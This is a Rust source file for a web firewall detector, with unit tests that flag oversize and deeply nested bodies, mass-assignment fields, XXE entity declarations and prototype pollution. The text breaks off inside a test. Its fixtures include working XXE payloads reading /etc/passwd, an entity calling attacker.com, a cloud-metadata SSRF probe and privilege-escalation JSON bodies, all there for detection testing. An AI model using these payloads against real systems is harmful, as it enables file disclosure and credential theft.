use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

use super::{Detector, Signal};

/// Body abuse detector: oversize + deep nesting + privileged-
/// field abuse (mass assignment) + XXE external-entity probes.
pub struct BodyAbuseDetector {
    /// Max body size in bytes before flagging.
    pub max_body_bytes: u64,
    /// Max JSON nesting depth.
    pub max_nesting_depth: usize,
}

impl Default for BodyAbuseDetector {
    fn default() -> Self {
        Self {
            max_body_bytes: 10 * 1024 * 1024, // 10 MiB
            max_nesting_depth: 20,
        }
    }
}

/// Privileged field names that are never expected from end-user
/// bodies on non-admin endpoints. Presence of any of these is a
/// strong mass-assignment / privilege-escalation signal — legit
/// clients shouldn't ever set their own role, admin flag, account
/// balance, password hash, or auth token via a profile PATCH or
/// registration POST.
///
/// 2026-05-18 S2 — widened from the original 16-key JSON-only list
/// to a 27-key set covering both snake_case and camelCase synonyms,
/// and to three surface scanners (JSON / form-encoded body / query
/// string / multipart name=) so privilege escalation that arrives
/// outside a JSON body now trips the detector. Plan reference:
/// `plans/issue-fix/2026-05-18-detector-recall-from-ml-eval/README.md`
/// §Sprint 2.
///
/// NB: deliberately excludes generic flags like `active` / `enabled`
/// — too common in benign bodies. The included keys are
/// auth/identity/financial — never expected from an end-user PATCH.
///
/// Used by the **multipart** name= surface only (value context for
/// multipart parts is deferred — no observed multipart FPs). `scope` is
/// dropped here too (S-C, 2026-06-18 r2); the JSON/form surfaces use the
/// value-context regexes below.
const MASS_ASSIGN_KEY_NAMES: &str = concat!(
    // Roles / admin flags
    "role|is_admin|isAdmin|is_superuser|isSuperuser|superuser|admin",
    "|",
    // Authorisation collections / access level
    "permissions|privileges|grants|access_level|accessLevel|user_level|userLevel",
    "|",
    // Financial fields
    "balance|account_balance|accountBalance|credit",
    "|",
    // Credentials / tokens
    "password_hash|passwordHash|api_key|apiKey|api_token|apiToken",
    "|",
    "access_token|accessToken|refresh_token|refreshToken",
    "|",
    // Verification flags
    "email_verified|emailVerified|verified",
);

/// Query-surface subset (S1, 2026-06-18). On the **query string** the
/// full 27-key set is dominated by false positives: `access_token`,
/// `apiKey`, `scope`, `credit`, `verified`, `balance` are ubiquitous
/// benign URL params (OAuth-token-in-URL, mapbox `access_token=pk…`,
/// billing filters). Credential/token/scope/financial/verified keys in
/// a *query* are an authz/gateway concern, not WAF mass-assignment.
///
/// The query scan is therefore restricted to the **unambiguous
/// privilege-escalation** keys — a `?role=admin` / `?is_admin=true` /
/// `?access_level=root` query has no legitimate first-party use. The
/// JSON / form-body / multipart surfaces keep the full key set above,
/// because a credential/token *field* in a write body is the real
/// mass-assignment shape. Plan: `plans/issues/PLAN-fp-detector-precision-2026-06-18.md` §2c.
const MASS_ASSIGN_QUERY_KEYS: &str = concat!(
    "role|is_admin|isAdmin|is_superuser|isSuperuser|superuser|admin",
    "|",
    "privileges|grants|access_level|accessLevel",
);

/// S-C (2026-06-18 round-2) — value-context split for the BODY surfaces.
/// The captured FPs are benign telemetry that *names* a privileged key but
/// carries a non-escalating value (`"is_admin":false`, `"role":"CREATOR"`,
/// `"scope":"read"`). Flagging on the key name alone produced the
/// mass-assignment benign blocks. The body surfaces now require value
/// context for the privilege keys; only the credential/financial/authz-
/// collection keys (never benign in a write body) stay name-match.
///
/// `scope` is intentionally DROPPED from every body surface — it is an
/// ubiquitous OAuth/analytics term (`openid`, `read`, `PAGE`).
///
/// Privilege FLAG keys — fire only on a TRUTHY value.
const MASS_ASSIGN_FLAG_KEYS: &str = concat!(
    "is_admin|isAdmin|is_superuser|isSuperuser|superuser|admin",
    "|",
    "email_verified|emailVerified|verified",
);
/// Role / access-level keys — fire only on a privilege-ESCALATING value.
const MASS_ASSIGN_ROLE_KEYS: &str =
    "role|access_level|accessLevel|user_level|userLevel";
/// Escalating role values. Longer alternatives first so `administrator`
/// wins over the `admin` prefix; each is `\b`-bounded at the call site.
///
/// FP-2026-07-07 (MA-2): `owner`, `system`, `sa` REMOVED — `{"role":"owner"}`
/// is the standard doc/workspace owner role and `{"role":"system"}` is the
/// LLM/chat-message shape; both are benign echoes, not privilege escalation.
/// The retained set still covers admin/root/superuser escalation.
const MASS_ASSIGN_ROLE_VALUES: &str =
    "administrator|superadmin|super_admin|superuser|sysadmin|admin|root";
/// Financial / authz-collection / password-hash keys — never expected from
/// an end-user write body regardless of value, so name-presence is the
/// signal (`scope` deliberately absent).
///
/// FP-2026-07-07 (MA-1): the credential/token keys (`api_key`, `apiKey`,
/// `api_token`, `apiToken`, `access_token`, `accessToken`, `refresh_token`,
/// `refreshToken`) were REMOVED from this body/form surface. Legit clients
/// echo them constantly (OAuth refresh, SDK init, session bootstrap) — the
/// same argument the query surface already made (see `MASS_ASSIGN_QUERY_KEYS`
/// note above). A stolen-token-in-write-body is an authz/gateway concern, not
/// mass-assignment. `password_hash`/`passwordHash` stays (never benign).
const MASS_ASSIGN_NAME_KEYS: &str = concat!(
    "permissions|privileges|grants",
    "|",
    "balance|account_balance|accountBalance|credit",
    "|",
    "password_hash|passwordHash",
);

/// JSON FLAG shape: `"is_admin"\s*:\s*<truthy>`. `"is_admin":false`/`:0`
/// (the dominant benign shape) does NOT match.
static MASS_ASSIGN_FLAG_JSON: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)"\s*(?:{MASS_ASSIGN_FLAG_KEYS})\s*"\s*:\s*(?:true|"true"|"1"|"yes"|"on"|1\b)"#
    ))
    .expect("mass-assign flag JSON regex compiles")
});
/// JSON ROLE shape: `"role"\s*:\s*"?<escalating>`. `"role":"CREATOR"` does
/// NOT match; `"role":"admin"` does. Nested wrappers still match.
static MASS_ASSIGN_ROLE_JSON: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)"\s*(?:{MASS_ASSIGN_ROLE_KEYS})\s*"\s*:\s*"?\s*(?:{MASS_ASSIGN_ROLE_VALUES})\b"#
    ))
    .expect("mass-assign role JSON regex compiles")
});
/// JSON NAME shape: `"key"\s*:` — keyed on property name (credential/
/// financial/authz keys only) so nested wrappers still match.
static MASS_ASSIGN_NAME_JSON: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)"\s*(?:{MASS_ASSIGN_NAME_KEYS})\s*"\s*:"#
    ))
    .expect("mass-assign name JSON regex compiles")
});

/// Form-encoded FLAG shape: `key=<truthy>` anchored at start or after `&`.
static MASS_ASSIGN_FLAG_FORM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)(?:^|&)(?:{MASS_ASSIGN_FLAG_KEYS})=(?:true|1|yes|on)(?:&|$)"#
    ))
    .expect("mass-assign flag form regex compiles")
});
/// Form-encoded ROLE shape: `key=<escalating>` with a value boundary so
/// `role=adminxyz` doesn't match.
static MASS_ASSIGN_ROLE_FORM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)(?:^|&)(?:{MASS_ASSIGN_ROLE_KEYS})=(?:{MASS_ASSIGN_ROLE_VALUES})(?:&|$)"#
    ))
    .expect("mass-assign role form regex compiles")
});
/// Form-encoded NAME shape: `key=` (credential/financial/authz keys).
static MASS_ASSIGN_NAME_FORM: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)(?:^|&)(?:{MASS_ASSIGN_NAME_KEYS})="#
    ))
    .expect("mass-assign name form regex compiles")
});

/// Query-surface form shape over the privilege-escalation subset.
/// Same `(?:^|&)key=` anchoring as `MASS_ASSIGN_KEYS_FORM` so
/// substring keys (e.g. `user_role=`) don't false-positive.
static MASS_ASSIGN_QUERY_KEYS_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)(?:^|&)(?:{MASS_ASSIGN_QUERY_KEYS})="#
    ))
    .expect("mass-assign query regex compiles")
});

/// Multipart shape: `Content-Disposition: form-data; name="role"`.
/// One regex over the peek window — cheaper than parsing multipart
/// parts at 8 KiB.
static MASS_ASSIGN_KEYS_MULTIPART: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&format!(
        r#"(?i)Content-Disposition:[^\r\n]*\bname\s*=\s*"(?:{MASS_ASSIGN_KEY_NAMES})""#
    ))
    .expect("mass-assign multipart regex compiles")
});

/// XXE external-entity declarations. Two ingredients are needed
/// for an attack: an `<!ENTITY ... SYSTEM "..." ...>` (or PUBLIC)
/// declaration that resolves to an external resource, and the
/// entity reference being expanded inside the document. We flag
/// the declaration; the parser will be the one that exfiltrates
/// if the upstream is XXE-vulnerable.
static XXE_ENTITY_DECL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?is)<!ENTITY\s+[^>]*\b(SYSTEM|PUBLIC)\b"#)
        .expect("xxe regex compiles")
});

impl Detector for BodyAbuseDetector {
    fn id(&self) -> &'static str {
        "body_abuse"
    }

    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();

        // 1. Check Content-Length for oversize.
        if let Some(cl) = req.body.content_length() {
            if cl > self.max_body_bytes {
                signals.push(Signal {
                    score: super::scores::body_abuse::OVERSIZE,
                    tag: "body_oversize".into(),
                    field: "body".into(),
                });
            }
        }

        // 2. S2 (2026-05-18) — mass-assignment via query string.
        // Independent of method/body: `GET /profile?role=admin` and
        // `POST /signup?isAdmin=true` both hit. Decoded once so
        // `%72ole=` and entity-encoded variants don't slip past.
        // S1 (2026-06-18): query scan uses the privilege-escalation
        // subset only — credential/token/scope/financial keys are
        // benign in URLs and belong to the gateway's authz layer.
        if let Some(query) = req.uri.query() {
            let decoded = super::url_decode(query);
            if MASS_ASSIGN_QUERY_KEYS_RE.is_match(&decoded)
                || MASS_ASSIGN_QUERY_KEYS_RE.is_match(query)
            {
                signals.push(Signal {
                    score: super::scores::body_abuse::MASS_ASSIGNMENT,
                    tag: "mass_assignment".into(),
                    field: "query".into(),
                });
            }
        }

        // 3. Check JSON nesting depth + mass-assignment + XXE +
        // form-encoded mass-assignment + multipart name= scan.
        let peek = req.body.peek(8192);
        if !peek.is_empty() {
            if let Ok(text) = std::str::from_utf8(peek) {
                let trimmed = text.trim_start();
                let content_type = req
                    .headers
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");

                // 3a. JSON-only checks.
                if trimmed.starts_with('{') || trimmed.starts_with('[') {
                    let depth = json_nesting_depth(trimmed);
                    if depth > self.max_nesting_depth {
                        signals.push(Signal {
                            score: super::scores::body_abuse::DEEP_NESTING,
                            tag: "body_deep_nesting".into(),
                            field: "body".into(),
                        });
                    }
                    // Mass assignment: privileged FLAG set truthy, ROLE set
                    // to an escalating value, or a credential/financial key
                    // present (S-C value context, 2026-06-18 r2).
                    if MASS_ASSIGN_FLAG_JSON.is_match(text)
                        || MASS_ASSIGN_ROLE_JSON.is_match(text)
                        || MASS_ASSIGN_NAME_JSON.is_match(text)
                    {
                        signals.push(Signal {
                            score: super::scores::body_abuse::MASS_ASSIGNMENT,
                            tag: "mass_assignment".into(),
                            field: "body".into(),
                        });
                    }
                    // GAP-010 (Run-5, 2026-05-08) — prototype
                    // pollution: `__proto__` key, or the
                    // `constructor` + `prototype` chain. Sub-tag
                    // `proto_pollution` for audit-log clarity;
                    // class stays under `body_abuse`.
                    check_proto_pollution(text, &mut signals);
                }

                // 3b. Form-encoded body mass-assignment. The
                // content-type sniff is conservative — only fires
                // when the framework would actually treat the body
                // as form fields. Match on both raw and url-decoded
                // forms so `%72ole=admin` is caught.
                if content_type.starts_with("application/x-www-form-urlencoded") {
                    let decoded = super::url_decode(text);
                    let hit = |s: &str| {
                        MASS_ASSIGN_FLAG_FORM.is_match(s)
                            || MASS_ASSIGN_ROLE_FORM.is_match(s)
                            || MASS_ASSIGN_NAME_FORM.is_match(s)
                    };
                    if hit(&decoded) || hit(text) {
                        signals.push(Signal {
                            score: super::scores::body_abuse::MASS_ASSIGNMENT,
                            tag: "mass_assignment".into(),
                            field: "body".into(),
                        });
                    }
                }

                // 3c. Multipart mass-assignment — scan the peek
                // window for `Content-Disposition: form-data;
                // name="role"`. Cheaper than parsing parts.
                if content_type.starts_with("multipart/form-data")
                    && MASS_ASSIGN_KEYS_MULTIPART.is_match(text)
                {
                    signals.push(Signal {
                        score: super::scores::body_abuse::MASS_ASSIGNMENT,
                        tag: "mass_assignment".into(),
                        field: "body".into(),
                    });
                }

                // 3d. XML-only check — XXE external-entity decl.
                // Recognises <?xml … ?> prologue OR a leading
                // root tag, then looks for <!ENTITY … SYSTEM/
                // PUBLIC anywhere in the peeked window.
                let looks_xml = trimmed.starts_with("<?xml")
                    || trimmed.starts_with("<!DOCTYPE")
                    || (trimmed.starts_with('<') && !trimmed.starts_with("<!--"));
                if looks_xml && XXE_ENTITY_DECL.is_match(text) {
                    signals.push(Signal {
                        score: super::scores::body_abuse::XXE,
                        tag: "xxe".into(),
                        field: "body".into(),
                    });
                }
            }
        }

        signals
    }
}

/// Prototype-pollution scan. Matches:
///   - `"__proto__"` as a JSON key (exact double-underscore form).
///     Single-underscore variants like `_proto_` or `proto` are
///     legitimate field names in some APIs and are not flagged.
///   - The `"constructor"` + `"prototype"` chain (e.g.
///     `{"constructor":{"prototype":{...}}}`). Both substrings must
///     appear so a body containing `"constructor":"NamedClass"`
///     alone (constructor as a string value, no prototype path)
///     does not fire.
///
/// Cheap pre-filter: bail before lowering the body if none of the
/// dangerous substrings appear. Full check uses ASCII lowercase
/// to remain case-insensitive without regex compile cost.
fn check_proto_pollution(body: &str, signals: &mut Vec<Signal>) {
    if !body.contains("__proto__")
        && !body.contains("constructor")
        && !body.contains("\"prototype\"")
    {
        return;
    }
    let lc = body.to_ascii_lowercase();
    if lc.contains("\"__proto__\"") {
        signals.push(Signal {
            score: super::scores::body_abuse::PROTO_POLLUTION,
            tag: "proto_pollution".into(),
            field: "body".into(),
        });
        return;
    }
    if lc.contains("\"constructor\"") && lc.contains("\"prototype\"") {
        signals.push(Signal {
            score: super::scores::body_abuse::PROTO_POLLUTION,
            tag: "proto_pollution".into(),
            field: "body".into(),
        });
    }
}

/// Count max nesting depth of JSON-like text.
fn json_nesting_depth(text: &str) -> usize {
    let mut max_depth = 0usize;
    let mut current = 0usize;
    let mut in_string = false;
    let mut escape = false;

    for ch in text.chars() {
        if escape {
            escape = false;
            continue;
        }
        if ch == '\\' && in_string {
            escape = true;
            continue;
        }
        if ch == '"' {
            in_string = !in_string;
            continue;
        }
        if in_string {
            continue;
        }
        match ch {
            '{' | '[' => {
                current += 1;
                if current > max_depth {
                    max_depth = current;
                }
            }
            '}' | ']' => {
                current = current.saturating_sub(1);
            }
            _ => {}
        }
    }
    max_depth
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn make_view_with_body(body: &[u8], content_length: Option<u64>) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::POST,
            "/api/data".parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::new(body.to_vec(), content_length, false),
        )
    }

    fn view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m, uri: u, version: http::Version::HTTP_11,
            headers: h, peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None, body: b,
        }
    }

    #[test]
    fn normal_body_no_signal() {
        let body = br#"{"name": "test", "value": 42}"#;
        let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
        let req = view(&m, &u, &h, &b);
        let d = BodyAbuseDetector::default();
        assert!(d.inspect(&req).is_empty());
    }

    #[test]
    fn oversize_body_flagged() {
        let d = BodyAbuseDetector {
            max_body_bytes: 100,
            max_nesting_depth: 20,
        };
        let (m, u, h, b) = make_view_with_body(b"small peek", Some(5000));
        let req = view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(signals.iter().any(|s| s.tag == "body_oversize"));
    }

    #[test]
    fn deep_nesting_flagged() {
        let d = BodyAbuseDetector {
            max_body_bytes: 10_000_000,
            max_nesting_depth: 5,
        };
        let body = r#"{"a":{"b":{"c":{"d":{"e":{"f":"deep"}}}}}}"#;
        let (m, u, h, b) = make_view_with_body(body.as_bytes(), Some(body.len() as u64));
        let req = view(&m, &u, &h, &b);
        let signals = d.inspect(&req);
        assert!(signals.iter().any(|s| s.tag == "body_deep_nesting"));
    }

    #[test]
    fn normal_nesting_ok() {
        let d = BodyAbuseDetector::default();
        let body = r#"{"a": [1, 2, {"b": true}]}"#;
        let (m, u, h, b) = make_view_with_body(body.as_bytes(), Some(body.len() as u64));
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    #[test]
    fn empty_body_no_signal() {
        let d = BodyAbuseDetector::default();
        let (m, u, h, b) = make_view_with_body(b"", Some(0));
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    #[test]
    fn non_json_body_no_nesting() {
        let d = BodyAbuseDetector {
            max_body_bytes: 10_000_000,
            max_nesting_depth: 2,
        };
        let body = b"Hello this is plain text not json at all";
        let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
        let req = view(&m, &u, &h, &b);
        assert!(d.inspect(&req).is_empty());
    }

    #[test]
    fn json_nesting_depth_simple() {
        assert_eq!(json_nesting_depth(r#"{"a": 1}"#), 1);
    }

    #[test]
    fn json_nesting_depth_nested() {
        assert_eq!(json_nesting_depth(r#"{"a": {"b": {"c": 1}}}"#), 3);
    }

    #[test]
    fn json_nesting_depth_array() {
        assert_eq!(json_nesting_depth(r#"[[[1]]]"#), 3);
    }

    #[test]
    fn json_nesting_depth_string_braces() {
        // Braces inside strings should be ignored.
        assert_eq!(json_nesting_depth(r#"{"a": "{{{}"}"#), 1);
    }

    // ---- Positive: oversize body (≥15 cases) ----
    macro_rules! oversize {
        ($name:ident, $size:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector { max_body_bytes: 100, max_nesting_depth: 20 };
                let (m, u, h, b) = make_view_with_body(b"x", Some($size));
                let req = view(&m, &u, &h, &b);
                assert!(d.inspect(&req).iter().any(|s| s.tag == "body_oversize"));
            }
        };
    }
    oversize!(oversize_200, 200);
    oversize!(oversize_1k, 1024);
    oversize!(oversize_5k, 5000);
    oversize!(oversize_10k, 10_000);
    oversize!(oversize_50k, 50_000);
    oversize!(oversize_100k, 100_000);
    oversize!(oversize_1m, 1_000_000);
    oversize!(oversize_5m, 5_000_000);
    oversize!(oversize_10m, 10_000_000);
    oversize!(oversize_50m, 50_000_000);
    oversize!(oversize_100m, 100_000_000);
    oversize!(oversize_500m, 500_000_000);
    oversize!(oversize_1g, 1_000_000_000);
    oversize!(oversize_101, 101);
    oversize!(oversize_999, 999);

    // ---- Positive: deep nesting (≥15 cases) ----
    macro_rules! deep {
        ($name:ident, $depth:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector { max_body_bytes: 10_000_000, max_nesting_depth: 5 };
                let open: String = "{\"a\":".repeat($depth);
                let close: String = "}".repeat($depth);
                let body = format!("{open}1{close}");
                let (m, u, h, b) = make_view_with_body(body.as_bytes(), Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                assert!(d.inspect(&req).iter().any(|s| s.tag == "body_deep_nesting"));
            }
        };
    }
    deep!(deep_6, 6);
    deep!(deep_7, 7);
    deep!(deep_8, 8);
    deep!(deep_10, 10);
    deep!(deep_12, 12);
    deep!(deep_15, 15);
    deep!(deep_20, 20);
    deep!(deep_25, 25);
    deep!(deep_30, 30);
    deep!(deep_50, 50);
    deep!(deep_100, 100);
    deep!(deep_200, 200);
    deep!(deep_9, 9);
    deep!(deep_11, 11);
    deep!(deep_13, 13);

    // ---- Negative: normal bodies (≥30 cases) ----
    macro_rules! normal_body {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                assert!(d.inspect(&req).is_empty());
            }
        };
    }
    normal_body!(normal_simple_obj, r#"{"key":"value"}"#);
    normal_body!(normal_array, r#"[1,2,3,4,5]"#);
    normal_body!(normal_nested_2, r#"{"a":{"b":1}}"#);
    normal_body!(normal_nested_3, r#"{"a":{"b":{"c":1}}}"#);
    normal_body!(normal_array_of_obj, r#"[{"a":1},{"b":2}]"#);
    normal_body!(normal_string_val, r#"{"name":"John Doe"}"#);
    normal_body!(normal_bool_val, r#"{"active":true}"#);
    normal_body!(normal_null_val, r#"{"data":null}"#);
    normal_body!(normal_number_val, r#"{"count":42}"#);
    normal_body!(normal_float_val, r#"{"price":9.99}"#);
    normal_body!(normal_empty_obj, r#"{}"#);
    normal_body!(normal_empty_arr, r#"[]"#);
    normal_body!(normal_text, "Hello, this is plain text");
    normal_body!(normal_xml, "<root><item>value</item></root>");
    normal_body!(normal_form, "name=John&email=john%40example.com");
    normal_body!(normal_csv, "name,age\nAlice,30\nBob,25");
    normal_body!(normal_html, "<html><body><p>Hello</p></body></html>");
    normal_body!(normal_multiline, "line1\nline2\nline3");
    normal_body!(normal_unicode, r#"{"msg":"héllo wörld"}"#);
    normal_body!(normal_escaped_quotes, r#"{"val":"he said \"hi\""}"#);
    normal_body!(normal_large_array, r#"[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]"#);
    normal_body!(normal_mixed_types, r#"{"s":"a","n":1,"b":true,"x":null}"#);
    normal_body!(normal_nested_arr, r#"{"data":[[1,2],[3,4]]}"#);
    normal_body!(normal_long_str, r#"{"text":"abcdefghijklmnopqrstuvwxyz0123456789"}"#);
    normal_body!(normal_api_resp, r#"{"status":"ok","code":200}"#);
    normal_body!(normal_list_resp, r#"{"items":[{"id":1},{"id":2}],"total":2}"#);
    normal_body!(normal_empty_string, r#"{"val":""}"#);
    normal_body!(normal_whitespace_json, "  { \"a\" : 1 } ");
    normal_body!(normal_binary_like, "some random bytes 0xFF 0x00");
    normal_body!(normal_single_val, "42");

    // ---- Positive: mass-assignment privileged-field probes ----
    macro_rules! mass_assign {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
                    signals.iter().any(|s| s.tag == "mass_assignment"),
                    "expected mass_assignment for: {}",
                    $body,
                );
            }
        };
    }
    mass_assign!(ma_role_admin,        r#"{"role":"admin"}"#);
    mass_assign!(ma_is_admin_true,     r#"{"is_admin":true}"#);
    mass_assign!(ma_is_admin_camel,    r#"{"isAdmin":true}"#);
    mass_assign!(ma_is_superuser,      r#"{"is_superuser":true}"#);
    mass_assign!(ma_superuser_alone,   r#"{"name":"a","superuser":true}"#);
    mass_assign!(ma_balance,           r#"{"balance":99999999}"#);
    mass_assign!(ma_account_balance,   r#"{"account_balance":1000}"#);
    mass_assign!(ma_password_hash,     r#"{"password_hash":"$2b$..."}"#);
    // FP-2026-07-07 (MA-1): api_key/api_token/access_token/refresh_token
    // NAME matching dropped from the body surface — now asserted clean in
    // the ma_clean block below (ma_clean_*_body).
    mass_assign!(ma_permissions,       r#"{"permissions":["*"]}"#);
    mass_assign!(ma_privileges,        r#"{"privileges":["root"]}"#);
    mass_assign!(ma_grants,            r#"{"grants":["root"]}"#);
    mass_assign!(ma_email_verified,    r#"{"email_verified":true}"#);
    mass_assign!(ma_combined_normal,   r#"{"name":"alice","role":"admin"}"#);
    mass_assign!(ma_with_whitespace,   r#"{ "role" : "admin" }"#);
    mass_assign!(ma_array_with_role,   r#"[{"name":"a"},{"role":"admin"}]"#);
    mass_assign!(ma_nested_role,       r#"{"profile":{"role":"admin"}}"#);

    // ---- Negative: bodies that should NOT trip mass-assign ----
    macro_rules! ma_clean {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
                    !signals.iter().any(|s| s.tag == "mass_assignment"),
                    "false positive mass_assignment for: {}",
                    $body,
                );
            }
        };
    }
    ma_clean!(ma_clean_name,           r#"{"name":"alice","email":"a@b.com"}"#);
    ma_clean!(ma_clean_message,        r#"{"message":"my role is unclear"}"#);
    ma_clean!(ma_clean_role_substr,    r#"{"description":"accessory rolepoint"}"#);
    ma_clean!(ma_clean_color,          r#"{"color":"admin","preference":"dark"}"#);
    ma_clean!(ma_clean_orderitems,     r#"{"items":[{"sku":"x","qty":1}]}"#);
    // S-C (2026-06-18 round-2) — value-context: a privileged KEY with a
    // non-escalating VALUE is benign telemetry, not mass-assignment. These
    // are the exact captured FP shapes (Instacart/Semrush/UberEats etc.).
    ma_clean!(ma_clean_is_admin_false, r#"{"is_admin":false}"#);
    ma_clean!(ma_clean_admin_false,    r#"{"admin":false}"#);
    ma_clean!(ma_clean_isadmin_false,  r#"{"isAdmin":false}"#);
    ma_clean!(ma_clean_superuser_false, r#"{"superuser":false}"#);
    ma_clean!(ma_clean_verified_false, r#"{"verified":false}"#);
    ma_clean!(ma_clean_role_creator,   r#"{"role":"CREATOR"}"#);
    ma_clean!(ma_clean_role_viewer,    r#"{"role":"viewer","name":"x"}"#);
    ma_clean!(ma_clean_role_region,    r#"{"role":"westus2"}"#);
    ma_clean!(ma_clean_scope_openid,   r#"{"scope":"openid profile email"}"#);
    ma_clean!(ma_clean_scope_read,     r#"{"scope":"read"}"#);
    ma_clean!(ma_clean_access_level_user, r#"{"access_level":"user"}"#);

    // ---- FP-2026-07-07 (MA-1) — credential/token field NAMES in a write
    // body are an authz/gateway concern, not classic mass-assignment. They
    // are echoed constantly by legit OAuth refresh / SDK-init / session
    // bootstrap payloads (instagram/semrush/sephora), each a 60-pt block.
    // Dropped from the JSON/form NAME set. `password_hash` stays (never a
    // benign write body); `permissions`/`balance` stay.
    ma_clean!(ma_clean_access_token_body,  r#"{"access_token":"..."}"#);
    ma_clean!(ma_clean_refresh_token_body, r#"{"refresh_token":"..."}"#);
    ma_clean!(ma_clean_api_key_body,       r#"{"api_key":"sk-..."}"#);
    ma_clean!(ma_clean_api_token_body,     r#"{"api_token":"tk-..."}"#);
    ma_clean!(ma_clean_accesstoken_camel,  r#"{"accessToken":"..."}"#);

    // ---- FP-2026-07-07 (MA-2) — `owner`/`system`/`sa` dropped from the
    // escalating role-value set. `{"role":"owner"}` is the standard doc/
    // workspace owner role (wetransfer/office-clipchamp/roughtrade) and
    // `{"role":"system"}` is the ubiquitous LLM/chat-message shape.
    ma_clean!(ma_clean_role_owner,   r#"{"role":"owner"}"#);
    ma_clean!(ma_clean_role_system,  r#"{"role":"system","content":"hi"}"#);

    // ---- Positive: XXE external-entity decls ----
    macro_rules! xxe {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
                    signals.iter().any(|s| s.tag == "xxe"),
                    "expected xxe for: {}",
                    $body,
                );
            }
        };
    }
    xxe!(xxe_classic_etcpasswd,
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#);
    xxe!(xxe_doctype_only,
        r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#);
    xxe!(xxe_public_id,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "any" "http://attacker.com/xxe.xml">]><foo>&xxe;</foo>"#);
    xxe!(xxe_param_entity,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname">%file;]><foo/>"#);
    xxe!(xxe_with_whitespace,
        "<?xml version=\"1.0\"?><!DOCTYPE r [\n<!ENTITY  x  SYSTEM  \"file:///etc/passwd\">\n]><r>&x;</r>");
    xxe!(xxe_no_prologue,
        r#"<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/">]><r>&x;</r>"#);

    // ---- Negative: clean XML bodies ----
    macro_rules! xxe_clean {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
                    !signals.iter().any(|s| s.tag == "xxe"),
                    "false positive xxe for: {}",
                    $body,
                );
            }
        };
    }
    xxe_clean!(xxe_clean_simple,
        r#"<?xml version="1.0"?><root><item>value</item></root>"#);
    xxe_clean!(xxe_clean_no_doctype,
        r#"<root><item>v</item></root>"#);
    xxe_clean!(xxe_clean_doctype_no_entity,
        r#"<?xml version="1.0"?><!DOCTYPE r SYSTEM "schema.dtd"><r/>"#);
    // ^ Note: <!DOCTYPE … SYSTEM is a doctype-public-id reference, not
    // an external-entity declaration; the regex requires <!ENTITY.
    xxe_clean!(xxe_clean_internal_entity,
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY name "value">]><r>&name;</r>"#);

    // ---- GAP-010 (Run-5) — prototype pollution positives ----
    macro_rules! proto_pollution {
        ($name:ident, $body:expr) => {
            #[test]
            fn $name() {
                let d = BodyAbuseDetector::default();
                let body = $body.as_bytes();
                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
                let req = view(&m, &u, &h, &b);
                let signals = d.inspect(&req);
                assert!(
